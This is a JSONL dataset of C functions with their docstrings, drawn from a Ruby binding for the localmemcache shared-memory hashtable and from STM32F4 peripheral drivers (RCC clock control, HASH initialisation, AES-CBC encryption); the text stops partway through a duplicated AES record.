{"docstring": "/*\n * call-seq: LocalMemCache.drop(*args)\n *\n * Deletes a memory pool.  If the :force option is set, locked semaphores are\n * removed as well.\n *\n * WARNING: Do only call this method with the :force option if you are sure\n * that you really want to remove this memory pool and no more processes are\n * still using it.\n *\n * If you delete a pool and other processes still have handles open on it, the\n * status of these handles becomes undefined.  There's no way for a process to\n * know when a handle is not valid anymore, so only delete a memory pool if\n * you are sure that all handles are closed.\n *\n * valid options for drop are \n * [:namespace] \n * [:filename] \n * [:force] \n *\n * The memory pool must be specified by either setting the :filename or\n * :namespace option.  The default for :force is false.\n */\n", "func_signal": "static VALUE LocalMemCache__drop(VALUE klass, VALUE o)", "code": "{\n  lmc_check_dict(o);\n  lmc_error_t e;\n  if (!local_memcache_drop_namespace(\n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_namespace)), \n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_filename)),\n      bool_value(rb_hash_aref(o, lmc_rb_sym_force)), &e)) {\n    rb_lmc_raise_exception(&e); \n  }\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "static VALUE ruby_string(const char *s)", "code": "{ return s ? rb_str_new2(s) : Qnil; }\n/* :nodoc: */\nint bool_value(VALUE v) { return v == Qtrue; }\n\n/* :nodoc: */\nstatic VALUE lmc_ruby_string2(const char *s, size_t l) { \n  return s ? rb_str_new(s, l) : Qnil; \n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.delete(key)   ->   Qnil\n *\n *  Deletes key from hashtable.  The key is converted to string.\n */\n", "func_signal": "static VALUE LocalMemCache__delete(VALUE obj, VALUE key)", "code": "{\n  lmc_rb_str_d_t k;\n  rstring_acquire(key, &k);\n  return local_memcache_delete(get_LocalMemCache(obj), k.cstr, k.len);\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "static VALUE LocalMemCache__disable_test_crash(VALUE klass)", "code": "{\n  lmc_test_crash_enabled = 0;\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "void rstring_acquire(VALUE s, lmc_rb_str_d_t *d)", "code": "{ \n  if (NIL_P(s)) {\n    d->cstr = \"nil\";\n    d->len = 0;\n    return;\n  }\n  VALUE v = TYPE(s) == T_STRING ? s : rb_funcall(s, rb_intern(\"to_s\"), 0);\n  d->cstr = RSTRING_PTR(v);\n  d->len = RSTRING_LEN(v);\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.keys()   ->   array or nil\n *\n *  Returns a list of keys.\n */\n", "func_signal": "static VALUE LocalMemCache__keys(VALUE obj)", "code": "{\n  VALUE d = rb_ary_new();\n  rb_ary_push(d, obj);\n  rb_ary_push(d, rb_ary_new());\n  int error = 0;\n  rb_protect(__LocalMemCache__keys, d, &error);\n  if (error) {\n    lmc_unlock_shm_region(\"local_memcache_iterate\", get_LocalMemCache(obj));\n    rb_exc_raise(ruby_errinfo);\n  }\n  return rb_ary_entry(d, 1);\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "static void rb_lmc_free_handle(rb_lmc_handle_t *h)", "code": "{\n  lmc_error_t e;\n  local_memcache_free(rb_lmc_check_handle_access(h), &e);\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.shm_status -> hash\n *\n *  Some status information on the shared memory:\n *\n *    :total_bytes # the total size of the shm in bytes \n *    :used_bytes  # how many bytes are used in this shm \n *                 # For exmpty namespaces this will reflect the amount\n *                 # of memory used for the hash buckets and some other \n *                 # administrative data structures.\n *    :free_bytes  # how many bytes are free \n */\n", "func_signal": "static VALUE LocalMemCache__shm_status(VALUE obj)", "code": "{\n  VALUE hash = rb_hash_new();\n  \n  local_memcache_t *lmc = get_LocalMemCache(obj);\n  if (!lmc_lock_shm_region(\"shm_status\", lmc)) return Qnil;\n  lmc_mem_status_t ms = lmc_status(lmc->base, \"shm_status\");\n  if (!lmc_unlock_shm_region(\"shm_status\", lmc)) return Qnil;\n\n  rb_hash_aset(hash, ID2SYM(rb_intern(\"free_bytes\")), \n      rb_int2big(ms.total_free_mem));\n  rb_hash_aset(hash, ID2SYM(rb_intern(\"total_bytes\")), \n      rb_int2big(ms.total_shm_size));\n  rb_hash_aset(hash, ID2SYM(rb_intern(\"used_bytes\")), rb_int2big(\n      ms.total_shm_size - ms.total_free_mem));\n  rb_hash_aset(hash, ID2SYM(rb_intern(\"free_chunks\")), rb_int2big(\n      ms.free_chunks));\n  rb_hash_aset(hash, ID2SYM(rb_intern(\"largest_chunk\")), rb_int2big(\n      ms.largest_chunk));\n  return hash;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "static VALUE LocalMemCache__new2(VALUE klass, VALUE o)", "code": "{\n  lmc_check_dict(o);\n  lmc_error_t e;\n  local_memcache_t *l = local_memcache_create(\n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_namespace)),\n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_filename)), \n      double_value(rb_hash_aref(o, lmc_rb_sym_size_mb)),\n      long_value(rb_hash_aref(o, lmc_rb_sym_min_alloc_size)), &e);\n  if (!l)  rb_lmc_raise_exception(&e);\n  rb_lmc_handle_t *h = calloc(1, sizeof(rb_lmc_handle_t));\n  if (!h) rb_raise(rb_eRuntimeError, \"memory allocation error\");\n  h->lmc = l;\n  h->open = 1;\n  return Data_Wrap_Struct(klass, NULL, rb_lmc_free_handle, h);\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.close()   ->   Qnil\n *\n *  Releases hashtable.\n */\n", "func_signal": "static VALUE LocalMemCache__close(VALUE obj)", "code": "{\n  lmc_error_t e;\n  rb_lmc_handle_t *h;\n  Data_Get_Struct(obj, rb_lmc_handle_t, h);\n  if (!local_memcache_free(rb_lmc_check_handle_access(h), &e)) \n      rb_lmc_raise_exception(&e);\n  h->open = 0;\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.set(key, value)   ->   Qnil\n *     lmc[key]=value        ->   Qnil\n *\n *  Set value for key in hashtable.  Value and key will be converted to\n *  string.\n */\n", "func_signal": "static VALUE LocalMemCache__set(VALUE obj, VALUE key, VALUE value)", "code": "{\n  local_memcache_t *lmc = get_LocalMemCache(obj);\n  lmc_rb_str_d_t k, v;\n  rstring_acquire(key, &k);\n  rstring_acquire(value, &v);\n  if (!local_memcache_set(lmc, k.cstr, k.len, v.cstr, v.len)) { \n    rb_lmc_raise_exception(&lmc->error); \n  }\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "int lmc_ruby_iter_collect_pairs(void *ctx, const char* key, const char* value)", "code": "{\n  lmc_ruby_iter_collect_pairs_t *data = ctx;\n  rb_ary_push(data->ary, rb_assoc_new(lmc_ruby_string(key), \n      lmc_ruby_string(value)));\n  return 1;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.random_pair()   ->  [key, value] or nil\n *\n *  Retrieves random pair from hashtable.\n */\n", "func_signal": "static VALUE LocalMemCache__random_pair(VALUE obj)", "code": "{\n  char *k, *v;\n  size_t n_k, n_v;\n  VALUE r = Qnil;\n  if (__local_memcache_random_pair(get_LocalMemCache(obj), &k, &n_k, &v, \n      &n_v)) {\n    r = rb_ary_new();\n    rb_ary_push(r, lmc_ruby_string2(k, n_k));\n    rb_ary_push(r, lmc_ruby_string2(v, n_v));\n  }\n  lmc_unlock_shm_region(\"local_memcache_random_pair\", \n      get_LocalMemCache(obj));\n  return r;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* \n *  call-seq:\n *     lmc.size -> number\n *\n *  Number of pairs in the hashtable.\n */\n", "func_signal": "static VALUE LocalMemCache__size(VALUE obj)", "code": "{\n  local_memcache_t *lmc = get_LocalMemCache(obj);\n  ht_hash_t *ht = lmc->base + lmc->va_hash;\n  return rb_int2big(ht->size);\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "long long_value(VALUE i)", "code": "{ return NIL_P(i) ? 0 : NUM2LONG(rb_Integer(i)); }\n/* :nodoc: */\ndouble double_value(VALUE i) { return NUM2DBL(i); }\n/* :nodoc: */\nVALUE num2string(long i) { return rb_big2str(rb_int2big(i), 10); }\n\ntypedef struct {\n  char *cstr;\n  size_t len;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "local_memcache_t *rb_lmc_check_handle_access(rb_lmc_handle_t *h)", "code": "{\n  if (!h || (h->open == 0) || !h->lmc) {\n    __rb_lmc_raise_exception(\"MemoryPoolClosed\", \"Pool is closed\");\n    return 0;\n  }\n  return h->lmc;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/*\n * call-seq: LocalMemCache.check(*args)\n *\n * Tries to repair a corrupt namespace.  Usually one doesn't call this method\n * directly, it's invoked automatically when operations time out.\n *\n * valid options are \n * [:namespace] \n * [:filename] \n *\n * The memory pool must be specified by either setting the :filename or\n * :namespace option. \n */\n", "func_signal": "static VALUE LocalMemCache__check(VALUE klass, VALUE o)", "code": "{\n  lmc_check_dict(o);\n  lmc_error_t e;\n  if (!local_memcache_check_namespace(\n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_namespace)), \n      rstring_ptr_null(rb_hash_aref(o, lmc_rb_sym_filename)),\n      &e)) {\n    rb_lmc_raise_exception(&e); \n  }\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/**\n  * @brief  Fills each HASH_InitStruct member with its default value.\n  * @param  HASH_InitStruct : pointer to a HASH_InitTypeDef structure which will\n  *          be initialized.  \n  *  @note  The default values set are : Processor mode is HASH, Algorithm selected is SHA1,\n  *          Data type selected is 32b and HMAC Key Type is short key.  \n  * @retval None\n  */\n", "func_signal": "void HASH_StructInit(HASH_InitTypeDef* HASH_InitStruct)", "code": "{\n  /* Initialize the HASH_AlgoSelection member */\n  HASH_InitStruct->HASH_AlgoSelection = HASH_AlgoSelection_SHA1;\n\n  /* Initialize the HASH_AlgoMode member */\n  HASH_InitStruct->HASH_AlgoMode = HASH_AlgoMode_HASH;\n\n  /* Initialize the HASH_DataType member */\n  HASH_InitStruct->HASH_DataType = HASH_DataType_32b;\n\n  /* Initialize the HASH_HMACKeyType member */\n  HASH_InitStruct->HASH_HMACKeyType = HASH_HMACKeyType_ShortKey;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_USB_Example\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the AHB3 peripheral clock during Low Power (Sleep) mode.\n  * @note   Peripheral clock gating in SLEEP mode can be used to further reduce\n  *         power consumption.\n  * @note   After wakeup from SLEEP mode, the peripheral clock is enabled again.\n  * @note   By default, all peripheral clocks are enabled during SLEEP mode.\n  * @param  RCC_AHBPeriph: specifies the AHB3 peripheral to gates its clock.\n  *          This parameter must be: RCC_AHB3Periph_FSMC\n  * @param  NewState: new state of the specified peripheral clock.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_AHB3PeriphClockLPModeCmd(uint32_t RCC_AHB3Periph, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_AHB3_PERIPH(RCC_AHB3Periph));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    RCC->AHB3LPENR |= RCC_AHB3Periph;\n  }\n  else\n  {\n    RCC->AHB3LPENR &= ~RCC_AHB3Periph;\n  }\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Encrypt and decrypt using AES in CBC Mode\n  * @param  Mode: encryption or decryption Mode.\n  *          This parameter can be one of the following values:\n  *            @arg MODE_ENCRYPT: Encryption\n  *            @arg MODE_DECRYPT: Decryption\n  * @param  InitVectors: Initialisation Vectors used for AES algorithm.\n  * @param  Key: Key used for AES algorithm.\n  * @param  Keysize: length of the Key, must be a 128, 192 or 256.\n  * @param  Input: pointer to the Input buffer.\n  * @param  Ilength: length of the Input buffer, must be a multiple of 16.\n  * @param  Output: pointer to the returned buffer.\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: Operation done\n  *          - ERROR: Operation failed\n  */\n", "func_signal": "ErrorStatus CRYP_AES_CBC(uint8_t Mode, uint8_t InitVectors[16], uint8_t *Key,\n                         uint16_t Keysize, uint8_t *Input, uint32_t Ilength,\n                         uint8_t *Output)", "code": "{\n  CRYP_InitTypeDef AES_CRYP_InitStructure;\n  CRYP_KeyInitTypeDef AES_CRYP_KeyInitStructure;\n  CRYP_IVInitTypeDef AES_CRYP_IVInitStructure;\n  __IO uint32_t counter = 0;\n  uint32_t busystatus = 0;\n  ErrorStatus status = SUCCESS;\n  uint32_t keyaddr    = (uint32_t)Key;\n  uint32_t inputaddr  = (uint32_t)Input;\n  uint32_t outputaddr = (uint32_t)Output;\n  uint32_t ivaddr     = (uint32_t)InitVectors;\n  uint32_t i = 0;\n\n  /* Crypto structures initialisation*/\n  CRYP_KeyStructInit(&AES_CRYP_KeyInitStructure);\n\n  switch(Keysize)\n  {\n    case 128:\n    AES_CRYP_InitStructure.CRYP_KeySize = CRYP_KeySize_128b;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 192:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_192b;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 256:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_256b;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    default:\n    break;\n  }\n\n  /* CRYP Initialization Vectors */\n  AES_CRYP_IVInitStructure.CRYP_IV0Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV0Right= __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Right= __REV(*(uint32_t*)(ivaddr));\n\n\n  /*------------------ AES Decryption ------------------*/\n  if(Mode == MODE_DECRYPT) /* AES decryption */\n  {\n    /* Flush IN/OUT FIFOs */\n    CRYP_FIFOFlush();\n\n    /* Crypto Init for Key preparation for decryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n    AES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_AES_Key;\n    AES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_32b;\n\n    CRYP_Init(&AES_CRYP_InitStructure);\n\n    /* Key Initialisation */\n    CRYP_KeyInit(&AES_CRYP_KeyInitStructure);\n\n    /* Enable Crypto processor */\n    CRYP_Cmd(ENABLE);\n\n    /* wait until the Busy flag is RESET */\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != AESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n      /* Crypto Init for decryption process */  \n      AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n    }\n  }\n  /*------------------ AES Encryption ------------------*/\n  else /* AES encryption */\n  {\n    CRYP_KeyInit(&AES_CRYP_KeyInitStructure);\n\n    /* Crypto Init for Encryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir  = CRYP_AlgoDir_Encrypt;\n  }\n  AES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_AES_CBC;\n  AES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_8b;\n  CRYP_Init(&AES_CRYP_InitStructure);\n\n  /* CRYP Initialization Vectors */\n  CRYP_IVInit(&AES_CRYP_IVInitStructure);\n\n  /* Flush IN/OUT FIFOs */\n  CRYP_FIFOFlush();\n\n  /* Enable Crypto processor */\n  CRYP_Cmd(ENABLE);\n\n\n  for(i=0; ((i<Ilength) && (status != ERROR)); i+=16)\n  {\n\n    /* Write the Input block in the IN FIFO */\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    /* Wait until the complete message has been processed */\n    counter = 0;\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != AESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n\n      /* Read the Output block from the Output FIFO */\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n    }\n  }\n\n  /* Disable Crypto */\n  CRYP_Cmd(DISABLE);\n\n  return status;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_Ethernet_Example\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp_aes.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Forces or releases AHB3 peripheral reset.\n  * @param  RCC_AHB3Periph: specifies the AHB3 peripheral to reset.\n  *          This parameter must be: RCC_AHB3Periph_FSMC\n  * @param  NewState: new state of the specified peripheral reset.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_AHB3PeriphResetCmd(uint32_t RCC_AHB3Periph, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_AHB3_PERIPH(RCC_AHB3Periph));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    RCC->AHB3RSTR |= RCC_AHB3Periph;\n  }\n  else\n  {\n    RCC->AHB3RSTR &= ~RCC_AHB3Periph;\n  }\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Encrypt and decrypt using AES in CBC Mode\n  * @param  Mode: encryption or decryption Mode.\n  *          This parameter can be one of the following values:\n  *            @arg MODE_ENCRYPT: Encryption\n  *            @arg MODE_DECRYPT: Decryption\n  * @param  InitVectors: Initialisation Vectors used for AES algorithm.\n  * @param  Key: Key used for AES algorithm.\n  * @param  Keysize: length of the Key, must be a 128, 192 or 256.\n  * @param  Input: pointer to the Input buffer.\n  * @param  Ilength: length of the Input buffer, must be a multiple of 16.\n  * @param  Output: pointer to the returned buffer.\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: Operation done\n  *          - ERROR: Operation failed\n  */\n", "func_signal": "ErrorStatus CRYP_AES_CBC(uint8_t Mode, uint8_t InitVectors[16], uint8_t *Key,\n                         uint16_t Keysize, uint8_t *Input, uint32_t Ilength,\n                         uint8_t *Output)", "code": "{\n  CRYP_InitTypeDef AES_CRYP_InitStructure;\n  CRYP_KeyInitTypeDef AES_CRYP_KeyInitStructure;\n  CRYP_IVInitTypeDef AES_CRYP_IVInitStructure;\n  __IO uint32_t counter = 0;\n  uint32_t busystatus = 0;\n  ErrorStatus status = SUCCESS;\n  uint32_t keyaddr    = (uint32_t)Key;\n  uint32_t inputaddr  = (uint32_t)Input;\n  uint32_t outputaddr = (uint32_t)Output;\n  uint32_t ivaddr     = (uint32_t)InitVectors;\n  uint32_t i = 0;\n\n  /* Crypto structures initialisation*/\n  CRYP_KeyStructInit(&AES_CRYP_KeyInitStructure);\n\n  switch(Keysize)\n  {\n    case 128:\n    AES_CRYP_InitStructure.CRYP_KeySize = CRYP_KeySize_128b;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 192:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_192b;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 256:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_256b;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    default:\n    break;\n  }\n\n  /* CRYP Initialization Vectors */\n  AES_CRYP_IVInitStructure.CRYP_IV0Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV0Right= __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Right= __REV(*(uint32_t*)(ivaddr));\n\n\n  /*------------------ AES Decryption ------------------*/\n  if(Mode == MODE_DECRYPT) /* AES decryption */\n  {\n    /* Flush IN/OUT FIFOs */\n    CRYP_FIFOFlush();\n\n    /* Crypto Init for Key preparation for decryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n    AES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_AES_Key;\n    AES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_32b;\n\n    CRYP_Init(&AES_CRYP_InitStructure);\n\n    /* Key Initialisation */\n    CRYP_KeyInit(&AES_CRYP_KeyInitStructure);\n\n    /* Enable Crypto processor */\n    CRYP_Cmd(ENABLE);\n\n    /* wait until the Busy flag is RESET */\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != AESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n      /* Crypto Init for decryption process */  \n      AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n    }\n  }\n  /*------------------ AES Encryption ------------------*/\n  else /* AES encryption */\n  {\n    CRYP_KeyInit(&AES_CRYP_KeyInitStructure);\n\n    /* Crypto Init for Encryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir  = CRYP_AlgoDir_Encrypt;\n  }\n  AES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_AES_CBC;\n  AES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_8b;\n  CRYP_Init(&AES_CRYP_InitStructure);\n\n  /* CRYP Initialization Vectors */\n  CRYP_IVInit(&AES_CRYP_IVInitStructure);\n\n  /* Flush IN/OUT FIFOs */\n  CRYP_FIFOFlush();\n\n  /* Enable Crypto processor */\n  CRYP_Cmd(ENABLE);\n\n\n  for(i=0; ((i<Ilength) && (status != ERROR)); i+=16)\n  {\n\n    /* Write the Input block in the IN FIFO */\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    /* 